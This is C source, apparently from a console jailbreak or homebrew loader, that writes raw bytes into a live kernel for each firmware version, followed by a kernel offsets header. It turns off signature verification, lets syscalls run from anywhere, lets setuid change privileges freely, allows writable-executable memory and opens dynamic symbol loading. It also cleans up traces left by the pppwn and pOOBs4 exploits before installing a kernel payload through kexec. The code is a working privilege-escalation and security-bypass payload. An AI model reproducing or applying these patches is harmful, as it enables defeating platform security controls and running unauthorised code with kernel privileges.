    // stop sysVeri from causing a delayed panic on suspend
    kmem = (uint8_t *)&kernel_ptr[0x00624F5F];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    // patch amd64_syscall() to allow calling syscalls everywhere
    kmem = (uint8_t *)&kernel_ptr[0x00000490];
    kmem[0] = 0x00;
    kmem[1] = 0x00;
    kmem[2] = 0x00;
    kmem[3] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004C2];
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x000004B9];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004B5];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    // patch sys_setuid() to allow freely changing the effective user ID
    kmem = (uint8_t *)&kernel_ptr[0x0022F3D6];
    kmem[0] = 0xEB;

    // patch vm_map_protect() (called by sys_mprotect()) to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x0014D6DD];
    kmem[0] = 0x00;
    kmem[1] = 0x00;
    kmem[2] = 0x00;
    kmem[3] = 0x00;

    // TODO: Description of this patch. patch sys_dynlib_load_prx()
    kmem = (uint8_t *)&kernel_ptr[0x00017474];
    kmem[0] = 0x90;
    kmem[1] = 0xE9;

    // patch sys_dynlib_dlsym() to allow dynamic symbol resolution everywhere
    kmem = (uint8_t *)&kernel_ptr[0x00017C2F];
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x003AD040];
    kmem[0] = 0x48;
    kmem[1] = 0x31;
    kmem[2] = 0xC0;
    kmem[3] = 0xC3;

    // patch sys_mmap() to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x00826EA];
    kmem[0] = 0x37;

    kmem = (uint8_t *)&kernel_ptr[0x00826ED];
    kmem[0] = 0x37;
  } else if (fw_version == 900) {
    // Fixes
    //   - [X] pOOBs4
    //   - [X] pppwn

    // Unpatch extra bytes from copyin, copyout, and copinstr (pppwn)
    kmem = (uint8_t *)&kernel_ptr[0x00271705];
    kmem[0] = 0xC7;

    kmem = (uint8_t *)&kernel_ptr[0x00271610];
    kmem[0] = 0xC6;

    kmem = (uint8_t *)&kernel_ptr[0x00271BB1];
    kmem[0] = 0xCE;

    // ChendoChap's patches from pOOBs4
    kmem = (uint8_t *)&kernel_ptr[0x00626874]; // veriPatch
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x00000ACD]; // bcopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x002713FD]; // bzero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x00271441]; // pagezero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x002714BD]; // memcpy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x00271501]; // pagecopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x002716AD]; // copyin
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x00271B5D]; // copyinstr
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x00271C2D]; // copystr
    kmem[0] = 0xEB;

    // stop sysVeri from causing a delayed panic on suspend
    kmem = (uint8_t *)&kernel_ptr[0x0062715F];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    // patch amd64_syscall() to allow calling syscalls everywhere
    kmem = (uint8_t *)&kernel_ptr[0x00000490];
    kmem[0] = 0x00;
    kmem[1] = 0x00;
    kmem[2] = 0x00;
    kmem[3] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004C2];
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x000004B9];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004B5];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    // patch sys_setuid() to allow freely changing the effective user ID
    kmem = (uint8_t *)&kernel_ptr[0x00001A06];
    kmem[0] = 0xEB;

    // patch vm_map_protect() (called by sys_mprotect()) to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x00080B8D];
    kmem[0] = 0x00;
    kmem[1] = 0x00;
    kmem[2] = 0x00;
    kmem[3] = 0x00;

    // TODO: Description of this patch. patch sys_dynlib_load_prx()
    kmem = (uint8_t *)&kernel_ptr[0x0023AEC4];
    kmem[0] = 0x90;
    kmem[1] = 0xE9;

    // patch sys_dynlib_dlsym() to allow dynamic symbol resolution everywhere
    kmem = (uint8_t *)&kernel_ptr[0x0023B67F];
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x00221B40];
    kmem[0] = 0x48;
    kmem[1] = 0x31;
    kmem[2] = 0xC0;
    kmem[3] = 0xC3;

    // patch sys_mmap() to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x0016632A];
    kmem[0] = 0x37;

    kmem = (uint8_t *)&kernel_ptr[0x0016632D];
    kmem[0] = 0x37;
  } else if (fw_version >= 903 && fw_version <= 904) {
    // Fixes
    //   - [X] pppwn

    // Unpatch extra bytes from copyin, copyout, and copinstr (pppwn)
    kmem = (uint8_t *)&kernel_ptr[0x00271385];
    kmem[0] = 0xC7;

    kmem = (uint8_t *)&kernel_ptr[0x00271290];
    kmem[0] = 0xC6;

    kmem = (uint8_t *)&kernel_ptr[0x00271831];
    kmem[0] = 0xCE;

    // ChendoChap's patches from pOOBs4
    kmem = (uint8_t *)&kernel_ptr[0x00624834]; // veriPatch
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x00000ACD]; // bcopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0027107D]; // bzero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x002710C1]; // pagezero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0027113D]; // memcpy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x00271181]; // pagecopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0027132D]; // copyin
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x002717DD]; // copyinstr
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x002718AD]; // copystr
    kmem[0] = 0xEB;

    // stop sysVeri from causing a delayed panic on suspend
    kmem = (uint8_t *)&kernel_ptr[0x0062511F];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    // patch amd64_syscall() to allow calling syscalls everywhere
    kmem = (uint8_t *)&kernel_ptr[0x00000490];
    kmem[0] = 0x00;
    kmem[1] = 0x00;
    kmem[2] = 0x00;
    kmem[3] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004C2];
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x000004B9];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004B5];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    // patch sys_setuid() to allow freely changing the effective user ID
    kmem = (uint8_t *)&kernel_ptr[0x00001A06];
    kmem[0] = 0xEB;

    // patch vm_map_protect() (called by sys_mprotect()) to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x00080B8D];
    kmem[0] = 0x00;
    kmem[1] = 0x00;
    kmem[2] = 0x00;
    kmem[3] = 0x00;

    // TODO: Description of this patch. patch sys_dynlib_load_prx()
    kmem = (uint8_t *)&kernel_ptr[0x0023AB94];
    kmem[0] = 0x90;
    kmem[1] = 0xE9;

    // patch sys_dynlib_dlsym() to allow dynamic symbol resolution everywhere
    kmem = (uint8_t *)&kernel_ptr[0x0023B34F];
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x00221810];
    kmem[0] = 0x48;
    kmem[1] = 0x31;
    kmem[2] = 0xC0;
    kmem[3] = 0xC3;

    // patch sys_mmap() to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x001662DA];
    kmem[0] = 0x37;

    kmem = (uint8_t *)&kernel_ptr[0x001662DD];
    kmem[0] = 0x37;
  } else if (fw_version >= 950 && fw_version <= 960) {
    // Fixes
    //   - [X] pppwn

    // Unpatch extra bytes from copyin, copyout, and copinstr (pppwn)
    kmem = (uint8_t *)&kernel_ptr[0x00201F15];
    kmem[0] = 0xC7;

    kmem = (uint8_t *)&kernel_ptr[0x00201E20];
    kmem[0] = 0xC6;

    kmem = (uint8_t *)&kernel_ptr[0x002023C1];
    kmem[0] = 0xCE;

    // ChendoChap's patches from pOOBs4
    kmem = (uint8_t *)&kernel_ptr[0x00624AE4]; // veriPatch
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x00000ACD]; // bcopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x00201C0D]; // bzero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x00201C51]; // pagezero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x00201CCD]; // memcpy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x00201D11]; // pagecopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x00201EBD]; // copyin
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0020236D]; // copyinstr
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0020243D]; // copystr
    kmem[0] = 0xEB;

    // stop sysVeri from causing a delayed panic on suspend
    kmem = (uint8_t *)&kernel_ptr[0x006253CF];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    // patch amd64_syscall() to allow calling syscalls everywhere
    kmem = (uint8_t *)&kernel_ptr[0x00000490];
    kmem[0] = 0x00;
    kmem[1] = 0x00;
    kmem[2] = 0x00;
    kmem[3] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004C2];
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x000004B9];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004B5];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    // patch sys_setuid() to allow freely changing the effective user ID
    kmem = (uint8_t *)&kernel_ptr[0x001FA536];
    kmem[0] = 0xEB;

    // patch vm_map_protect() (called by sys_mprotect()) to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x00196D3D];
    kmem[0] = 0x00;
    kmem[1] = 0x00;
    kmem[2] = 0x00;
    kmem[3] = 0x00;

    // TODO: Description of this patch. patch sys_dynlib_load_prx()
    kmem = (uint8_t *)&kernel_ptr[0x0019F724];
    kmem[0] = 0x90;
    kmem[1] = 0xE9;

    // patch sys_dynlib_dlsym() to allow dynamic symbol resolution everywhere
    kmem = (uint8_t *)&kernel_ptr[0x0019FEDF];
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x00011960];
    kmem[0] = 0x48;
    kmem[1] = 0x31;
    kmem[2] = 0xC0;
    kmem[3] = 0xC3;

    // patch sys_mmap() to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x00122D7A];
    kmem[0] = 0x37;

    kmem = (uint8_t *)&kernel_ptr[0x00122D7D];
    kmem[0] = 0x37;
  } else if (fw_version >= 1000 && fw_version <= 1001) {
    // Fixes
    //   - [X] pppwn

    // Unpatch extra bytes from copyin, copyout, and copinstr (pppwn)
    kmem = (uint8_t *)&kernel_ptr[0x00472F75];
    kmem[0] = 0xC7;

    kmem = (uint8_t *)&kernel_ptr[0x00472E80];
    kmem[0] = 0xC6;

    kmem = (uint8_t *)&kernel_ptr[0x00473421];
    kmem[0] = 0xCE;

    // ChendoChap's patches from pOOBs4
    kmem = (uint8_t *)&kernel_ptr[0x0061E864]; // veriPatch
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x00000ACD]; // bcopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x00472C6D]; // bzero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x00472CB1]; // pagezero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x00472D2D]; // memcpy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x00472D71]; // pagecopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x00472F1D]; // copyin
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x004733CD]; // copyinstr
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0047349D]; // copystr
    kmem[0] = 0xEB;

    // stop sysVeri from causing a delayed panic on suspend
    kmem = (uint8_t *)&kernel_ptr[0x0061F14F];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    // patch amd64_syscall() to allow calling syscalls everywhere
    kmem = (uint8_t *)&kernel_ptr[0x00000490];
    kmem[0] = 0x00;
    kmem[1] = 0x00;
    kmem[2] = 0x00;
    kmem[3] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004C2];
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x000004B9];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004B5];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    // patch sys_setuid() to allow freely changing the effective user ID
    kmem = (uint8_t *)&kernel_ptr[0x00267756];
    kmem[0] = 0xEB;

    // patch vm_map_protect() (called by sys_mprotect()) to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x0392070D];
    kmem[0] = 0x00;
    kmem[1] = 0x00;
    kmem[2] = 0x00;
    kmem[3] = 0x00;

    // TODO: Description of this patch. patch sys_dynlib_load_prx()
    kmem = (uint8_t *)&kernel_ptr[0x0018FAA4];
    kmem[0] = 0x90;
    kmem[1] = 0xE9;

    // patch sys_dynlib_dlsym() to allow dynamic symbol resolution everywhere
    kmem = (uint8_t *)&kernel_ptr[0x0019025F];
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x001BEA40];
    kmem[0] = 0x48;
    kmem[1] = 0x31;
    kmem[2] = 0xC0;
    kmem[3] = 0xC3;

    // patch sys_mmap() to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x000ED59A];
    kmem[0] = 0x37;

    kmem = (uint8_t *)&kernel_ptr[0x000ED59D];
    kmem[0] = 0x37;
  } else if (fw_version >= 1050 && fw_version <= 1071) {
    // Fixes
    //   - [X] pppwn

    // Unpatch extra bytes from copyin, copyout, and copinstr (pppwn)
    kmem = (uint8_t *)&kernel_ptr[0x000D75C5];
    kmem[0] = 0xC7;

    kmem = (uint8_t *)&kernel_ptr[0x000D74D0];
    kmem[0] = 0xC6;

    kmem = (uint8_t *)&kernel_ptr[0x000D7A71];
    kmem[0] = 0xCE;

    // LightningMods's additional dlsym patches
    kmem = (uint8_t *)&kernel_ptr[0x213013]; // skip check 1
    kmem[0] = 0xEB;
    kmem[1] = 0x04;

    kmem = (uint8_t *)&kernel_ptr[0x213023]; // skip check 2
    kmem[0] = 0xEB;
    kmem[1] = 0x04;

    kmem = (uint8_t *)&kernel_ptr[0x213043]; // nop + jmp
    kmem[0] = 0x90;
    kmem[1] = 0xE9;

    // ChendoChap's patches from pOOBs4
    kmem = (uint8_t *)&kernel_ptr[0x00627DB4]; // veriPatch
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x00000ACD]; // bcopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x000D72BD]; // bzero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x000D7301]; // pagezero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x000D737D]; // memcpy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x000D73C1]; // pagecopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x000D756D]; // copyin
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x000D7A1D]; // copyinstr
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x000D7AED]; // copystr
    kmem[0] = 0xEB;

    // stop sysVeri from causing a delayed panic on suspend
    kmem = (uint8_t *)&kernel_ptr[0x0062869F];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    // patch amd64_syscall() to allow calling syscalls everywhere
    kmem = (uint8_t *)&kernel_ptr[0x00000490];
    kmem[0] = 0x00;
    kmem[1] = 0x00;
    kmem[2] = 0x00;
    kmem[3] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004C2];
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x000004B9];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004B5];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    // patch sys_setuid() to allow freely changing the effective user ID
    kmem = (uint8_t *)&kernel_ptr[0x0008C1C6];
    kmem[0] = 0xEB;

    // patch vm_map_protect() (called by sys_mprotect()) to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x0047B2EE];
    kmem[0] = 0x00;
    kmem[1] = 0x00;
    kmem[2] = 0x00;
    kmem[3] = 0x00;

    // TODO: Description of this patch. patch sys_dynlib_load_prx()
    kmem = (uint8_t *)&kernel_ptr[0x00212AD4];
    kmem[0] = 0x90;
    kmem[1] = 0xE9;

    // patch sys_dynlib_dlsym() to allow dynamic symbol resolution everywhere
    kmem = (uint8_t *)&kernel_ptr[0x00213088];
    kmem[0] = 0x90;
    kmem[1] = 0xE9;
    kmem[2] = 0x3C;
    kmem[3] = 0x01;

    kmem = (uint8_t *)&kernel_ptr[0x002DAB60];
    kmem[0] = 0x48;
    kmem[1] = 0x31;
    kmem[2] = 0xC0;
    kmem[3] = 0xC3;

    // patch sys_mmap() to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x0019C42A];
    kmem[0] = 0x37;

    kmem = (uint8_t *)&kernel_ptr[0x0019C42D];
    kmem[0] = 0x37;
  } else if (fw_version == 1100) {
    // Fixes
    //   - [X] pppwn

    // TODO: Unpatch extra bytes from copyin, copyout, and copinstr (pppwn)
    kmem = (uint8_t *)&kernel_ptr[0x002DE045];
    kmem[0] = 0xC7;

    kmem = (uint8_t *)&kernel_ptr[0x002DDF50];
    kmem[0] = 0xC6;

    kmem = (uint8_t *)&kernel_ptr[0x002DE4F1];
    kmem[0] = 0xCE;

    // LightningMods's additional dlsym patches
    kmem = (uint8_t *)&kernel_ptr[0x001E4C33]; // skip check 1
    kmem[0] = 0xEB;
    kmem[1] = 0x04;

    kmem = (uint8_t *)&kernel_ptr[0x001E4C43]; // skip check 2
    kmem[0] = 0xEB;
    kmem[1] = 0x04;

    kmem = (uint8_t *)&kernel_ptr[0x001E4C63]; // nop + jmp
    kmem[0] = 0x90;
    kmem[1] = 0xE9;

    // ChendoChap's patches from pOOBs4
    kmem = (uint8_t *)&kernel_ptr[0x00623F64]; // veriPatch
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x00000ACD]; // bcopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x002DDD3D]; // bzero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x002DDD81]; // pagezero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x002DDDFD]; // memcpy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x002DDE41]; // pagecopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x002DDFED]; // copyin
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x002DE49D]; // copyinstr
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x002DE56D]; // copystr
    kmem[0] = 0xEB;

    // stop sysVeri from causing a delayed panic on suspend
    kmem = (uint8_t *)&kernel_ptr[0x0062484F];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    // patch amd64_syscall() to allow calling syscalls everywhere
    kmem = (uint8_t *)&kernel_ptr[0x00000490];
    kmem[0] = 0x00;
    kmem[1] = 0x00;
    kmem[2] = 0x00;
    kmem[3] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004C2];
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x000004B9];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004B5];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    // patch sys_setuid() to allow freely changing the effective user ID
    kmem = (uint8_t *)&kernel_ptr[0x00431526];
    kmem[0] = 0xEB;

    // patch vm_map_protect() (called by sys_mprotect()) to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x0035C8EE];
    kmem[0] = 0x00;
    kmem[1] = 0x00;
    kmem[2] = 0x00;
    kmem[3] = 0x00;

    // TODO: Description of this patch. patch sys_dynlib_load_prx()
    kmem = (uint8_t *)&kernel_ptr[0x001E46F4];
    kmem[0] = 0x90;
    kmem[1] = 0xE9;

    // patch sys_dynlib_dlsym() to allow dynamic symbol resolution everywhere
    kmem = (uint8_t *)&kernel_ptr[0x001E4CA8];
    kmem[0] = 0x90;
    kmem[1] = 0xE9;
    kmem[2] = 0x3C;
    kmem[3] = 0x01;

    kmem = (uint8_t *)&kernel_ptr[0x00088CE0];
    kmem[0] = 0x48;
    kmem[1] = 0x31;
    kmem[2] = 0xC0;
    kmem[3] = 0xC3;

    // patch sys_mmap() to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x0015626A];
    kmem[0] = 0x37;

    kmem = (uint8_t *)&kernel_ptr[0x0015626D];
    kmem[0] = 0x37;
  }

  // Restore write protection
  writeCr0(cr0);

  return 0;
}

// Passes on the result of kpayload_patches
int install_patches() {
  struct kpayload_firmware_info kpayload_firmware_info;
  kpayload_firmware_info.fw_version = get_firmware();
  return kexec(&kpayload_patches, &kpayload_firmware_info);
}

// Passes on the result of kpayload_install_payload
int install_payload(struct configuration *config) {
  struct kpayload_payload_info kpayload_payload_info;
  kpayload_payload_info.fw_version = get_firmware();
  kpayload_payload_info.config = *config;
  kpayload_payload_info.buffer = (uint8_t *)kpayload_bin;
  kpayload_payload_info.size = (size_t)kpayload_bin_len;

  return kexec(&kpayload_install_payload, &kpayload_payload_info);
}

// Passes on the result of kpayload_exploit_fixes
int exploit_fixes() {
  struct kpayload_firmware_info kpayload_firmware_info;
  kpayload_firmware_info.fw_version = get_firmware();
  return kexec(&kpayload_exploit_fixes, &kpayload_firmware_info);
}
 #ifndef OFFSETS_H_
#define OFFSETS_H_

// clang-format off

#define K300_PMAP_PROTECT  0x0
#define K310_PMAP_PROTECT  0x0
#define K311_PMAP_PROTECT  0x0
#define K315_PMAP_PROTECT  0x0
#define K350_PMAP_PROTECT  0x0
#define K355_PMAP_PROTECT  0x0
#define K370_PMAP_PROTECT  0x0
#define K400_PMAP_PROTECT  0x0
#define K401_PMAP_PROTECT  0x0
#define K405_PMAP_PROTECT  0x0
#define K406_PMAP_PROTECT  0x0
#define K407_PMAP_PROTECT  0x0
#define K450_PMAP_PROTECT  0x0
#define K455_PMAP_PROTECT  0x0
#define K470_PMAP_PROTECT  0x0
#define K471_PMAP_PROTECT  0x0
#define K472_PMAP_PROTECT  0x0
#define K473_PMAP_PROTECT  0x0
#define K474_PMAP_PROTECT  0x00421180
#define K500_PMAP_PROTECT  0x002E2D00
#define K501_PMAP_PROTECT  0x002E2D00
#define K503_PMAP_PROTECT  0x002E3090
#define K505_PMAP_PROTECT  0x002E3090
#define K507_PMAP_PROTECT  0x002E3090
#define K550_PMAP_PROTECT  0x002FC6F0
#define K553_PMAP_PROTECT  0x002FC5F0
#define K555_PMAP_PROTECT  0x002FC960
#define K556_PMAP_PROTECT  0x002EBAA0
#define K600_PMAP_PROTECT  0x002EBAA0
#define K602_PMAP_PROTECT  0x002EBAA0
#define K620_PMAP_PROTECT  0x002EBAC0
#define K650_PMAP_PROTECT  0x00050F50
#define K651_PMAP_PROTECT  0x00050F50
#define K670_PMAP_PROTECT  0x00050F50
#define K671_PMAP_PROTECT  0x00050F50
#define K672_PMAP_PROTECT  0x00050F50
#define K700_PMAP_PROTECT  0x003E18A0
#define K701_PMAP_PROTECT  0x003E18A0
#define K702_PMAP_PROTECT  0x003E18A0
#define K750_PMAP_PROTECT  0x001A9800
#define K751_PMAP_PROTECT  0x001A9800
#define K755_PMAP_PROTECT  0x001A9800
#define K800_PMAP_PROTECT  0x00383600
#define K801_PMAP_PROTECT  0x00383600
#define K803_PMAP_PROTECT  0x00383600
#define K850_PMAP_PROTECT  0x00119460
#define K852_PMAP_PROTECT  0x00119460
#define K900_PMAP_PROTECT  0x0012FA90
#define K903_PMAP_PROTECT  0x0012FA40
#define K904_PMAP_PROTECT  0x0012FA40
#define K950_PMAP_PROTECT  0x00431ED0
#define K951_PMAP_PROTECT  0x00431ED0
#define K960_PMAP_PROTECT  0x00431ED0
#define K1000_PMAP_PROTECT 0x000E2420
#define K1001_PMAP_PROTECT 0x000E2420
#define K1050_PMAP_PROTECT 0x00046EF0
#define K1070_PMAP_PROTECT 0x00046EF0
#define K1071_PMAP_PROTECT 0x00046EF0
#define K1100_PMAP_PROTECT 0x00116CB0
#define K1102_PMAP_PROTECT 0x00116CD0
#define K1150_PMAP_PROTECT 0x00059DF0
#define K1152_PMAP_PROTECT 0x00059DF0
#define K1200_PMAP_PROTECT 0x00059DF0
#define K1202_PMAP_PROTECT 0x00059DF0
#define K1250_PMAP_PROTECT 0x00059DF0
#define K1252_PMAP_PROTECT 0x00059DF0

#define K300_PMAP_PROTECT_P  0x0
#define K310_PMAP_PROTECT_P  0x0
#define K311_PMAP_PROTECT_P  0x0
#define K315_PMAP_PROTECT_P  0x0
#define K350_PMAP_PROTECT_P  0x0
#define K355_PMAP_PROTECT_P  0x0
#define K370_PMAP_PROTECT_P  0x0
#define K400_PMAP_PROTECT_P  0x0
#define K401_PMAP_PROTECT_P  0x0
#define K405_PMAP_PROTECT_P  0x0
#define K406_PMAP_PROTECT_P  0x0
#define K407_PMAP_PROTECT_P  0x0
#define K450_PMAP_PROTECT_P  0x0
#define K455_PMAP_PROTECT_P  0x0
#define K470_PMAP_PROTECT_P  0x0
#define K471_PMAP_PROTECT_P  0x0
#define K472_PMAP_PROTECT_P  0x0
#define K473_PMAP_PROTECT_P  0x0
#define K474_PMAP_PROTECT_P  0x004211C4
#define K500_PMAP_PROTECT_P  0x002E2D44
#define K501_PMAP_PROTECT_P  0x002E2D44
#define K503_PMAP_PROTECT_P  0x002E30D4
#define K505_PMAP_PROTECT_P  0x002E30D4
#define K507_PMAP_PROTECT_P  0x002E30D4
#define K550_PMAP_PROTECT_P  0x002FC736
#define K553_PMAP_PROTECT_P  0x002FC636
#define K555_PMAP_PROTECT_P  0x002FC9A6
#define K556_PMAP_PROTECT_P  0x002EBAE8
#define K600_PMAP_PROTECT_P  0x002EBAE8
#define K602_PMAP_PROTECT_P  0x002EBAE8
#define K620_PMAP_PROTECT_P  0x002EBB08
#define K650_PMAP_PROTECT_P  0x00050F9C
#define K651_PMAP_PROTECT_P  0x00050F9C
#define K670_PMAP_PROTECT_P  0x00050F9C
#define K671_PMAP_PROTECT_P  0x00050F9C
#define K672_PMAP_PROTECT_P  0x00050F9C
#define K700_PMAP_PROTECT_P  0x003E18E7
#define K701_PMAP_PROTECT_P  0x003E18E7
#define K702_PMAP_PROTECT_P  0x003E18E7
#define K750_PMAP_PROTECT_P  0x001A9847
#define K751_PMAP_PROTECT_P  0x001A9847
#define K755_PMAP_PROTECT_P  0x001A9847
#define K800_PMAP_PROTECT_P  0x00383647
#define K801_PMAP_PROTECT_P  0x00383647
#define K803_PMAP_PROTECT_P  0x00383647
#define K850_PMAP_PROTECT_P  0x001194A7
#define K852_PMAP_PROTECT_P  0x001194A7
#define K900_PMAP_PROTECT_P  0x0012FAD7
#define K903_PMAP_PROTECT_P  0x0012FA87
#define K904_PMAP_PROTECT_P  0x0012FA87
#define K950_PMAP_PROTECT_P  0x00431F17
#define K951_PMAP_PROTECT_P  0x00431F17
#define K960_PMAP_PROTECT_P  0x00431F17
#define K1000_PMAP_PROTECT_P 0x000E2467
#define K1001_PMAP_PROTECT_P 0x000E2467
#define K1050_PMAP_PROTECT_P 0x00046F37
#define K1070_PMAP_PROTECT_P 0x00046F37
#define K1071_PMAP_PROTECT_P 0x00046F37
#define K1100_PMAP_PROTECT_P 0x00116CF7
#define K1102_PMAP_PROTECT_P 0x00116D17
#define K1150_PMAP_PROTECT_P 0x00059E37
#define K1152_PMAP_PROTECT_P 0x00059E37
#define K1200_PMAP_PROTECT_P 0x00059E37
#define K1202_PMAP_PROTECT_P 0x00059E37
#define K1250_PMAP_PROTECT_P 0x00059E37
#define K1252_PMAP_PROTECT_P 0x00059E37

#define K300_PMAP_STORE  0x0
#define K310_PMAP_STORE  0x0
#define K311_PMAP_STORE  0x0
#define K315_PMAP_STORE  0x0
#define K350_PMAP_STORE  0x0
#define K355_PMAP_STORE  0x0
#define K370_PMAP_STORE  0x0
#define K400_PMAP_STORE  0x0
#define K401_PMAP_STORE  0x0
#define K405_PMAP_STORE  0x0
#define K406_PMAP_STORE  0x0
